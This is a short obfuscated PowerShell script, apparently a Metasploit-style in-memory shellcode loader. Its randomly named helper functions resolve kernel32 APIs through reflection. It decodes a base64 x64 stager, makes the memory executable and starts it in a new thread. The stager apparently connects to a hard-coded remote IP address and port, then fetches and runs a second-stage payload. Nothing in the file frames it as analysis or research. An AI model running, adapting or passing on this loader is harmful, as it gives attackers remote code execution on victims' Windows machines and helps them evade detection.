function qGZz {
        Param ($qc, $vE51)
        $c9QV = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $c9QV.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($c9QV.GetMethod('GetModuleHandle')).Invoke($null, @($qc)))), $vE51))
}

function tQueG {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $oA,
                [Parameter(Position = 1)] [Type] $e0 = [Void]
        )

        $kmEz = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $kmEz.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $oA).SetImplementationFlags('Runtime, Managed')
        $kmEz.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $e0, $oA).SetImplementationFlags('Runtime, Managed')

        return $kmEz.CreateType()
}

[Byte[]]$c0 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGEiLUiBWSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAhquFJEGEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$fqMDc = 0
$c2VIx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qGZz kernel32.dll VirtualAlloc), (tQueG @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $c0.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($c0, 0, $c2VIx, $c0.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qGZz kernel32.dll VirtualProtect), (tQueG @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($c2VIx, [Uint32]$c0.Length, 0x10, [Ref]$fqMDc)) -eq $true) {
        $pb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qGZz kernel32.dll CreateThread), (tQueG @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$c2VIx,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qGZz kernel32.dll WaitForSingleObject), (tQueG @([IntPtr], [Int32]))).Invoke($pb,0xffffffff) | Out-Null
}
